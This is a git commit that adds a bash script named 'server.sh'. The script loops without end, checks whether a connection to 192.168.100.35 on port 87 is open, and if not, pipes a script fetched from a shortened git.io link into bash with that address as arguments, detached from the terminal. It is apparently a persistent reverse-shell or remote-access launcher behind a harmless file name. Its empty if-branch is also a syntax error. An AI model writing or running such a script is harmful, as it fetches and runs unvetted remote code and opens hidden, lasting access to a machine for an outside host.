c64e2e332de2ab8e3d3a3aba28c9b26e91fe90f3
sorrynotsorry <54444533+sorrynotsorry1@users.noreply.github.com>
2022-07-27 16:06:20 +1000

    Create server.sh

---
+++ server.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+while true; do
+
+CHECK_IF_CONNECTED=$(lsof -i -P -n | grep ESTABLISHED)
+
+if [[ "$CHECK_IF_CONNECTED" == *"192.168.100.35:87"* ]]; then
+
+else
+
+	curl -Ls https://git.io/vXd2N | bash -s 192.168.100.35 87 & disown
+	
+fi
+	
+done
